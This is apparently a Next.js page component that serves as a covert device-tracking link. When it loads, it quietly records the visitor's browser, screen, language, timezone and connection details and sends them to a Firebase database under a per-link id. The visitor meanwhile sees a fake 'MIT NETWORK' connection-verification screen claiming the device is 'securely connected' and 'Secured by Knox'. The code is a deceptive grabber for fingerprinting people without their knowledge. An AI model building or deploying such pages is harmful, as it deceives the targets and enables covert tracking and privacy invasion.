"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { ref, push } from "firebase/database";
import { database } from "@/lib/firebase";
import { motion } from "framer-motion";
import { Shield, CheckCircle } from "lucide-react";

export default function CapturePage() {
  const params = useParams();
  const [captured, setCaptured] = useState(false);

  useEffect(() => {
    const captureDeviceData = async () => {
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        colorDepth: screen.colorDepth,
        timestamp: Date.now(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
      };

      try {
        const devicesRef = ref(database, `device-data/${params.id}`);
        await push(devicesRef, deviceInfo);
        setCaptured(true);
      } catch (error) {
        console.error("Error capturing device data:", error);
      }
    };

    captureDeviceData();
  }, [params.id]);

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-gradient-to-br from-black via-emerald-950/20 to-black px-4">
      <motion.div
        initial={{ scale: 0.8, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        className="text-center"
      >
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: "spring", delay: 0.2 }}
          className="mx-auto mb-6 flex h-24 w-24 items-center justify-center rounded-3xl bg-gradient-to-br from-emerald-500 to-emerald-700 shadow-2xl shadow-emerald-500/30"
        >
          {captured ? (
            <CheckCircle size={48} className="text-white" />
          ) : (
            <Shield size={48} className="text-white" />
          )}
        </motion.div>

        <h1 className="text-3xl font-bold text-white">MIT NETWORK</h1>
        
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.5 }}
          className="mt-6 rounded-2xl border border-emerald-500/20 bg-emerald-950/30 p-6 backdrop-blur-sm"
        >
          {captured ? (
            <>
              <p className="text-emerald-400">Connection Verified</p>
              <p className="mt-2 text-sm text-emerald-500/60">
                Your device has been securely connected to the network.
              </p>
            </>
          ) : (
            <>
              <div className="flex items-center justify-center gap-2">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="h-5 w-5 rounded-full border-2 border-emerald-500/30 border-t-emerald-500"
                />
                <span className="text-emerald-400">Verifying connection...</span>
              </div>
            </>
          )}
        </motion.div>

        <p className="mt-6 text-xs text-emerald-500/40">
          Secured by Knox • MIT Network v2.0
        </p>
      </motion.div>
    </div>
  );
}
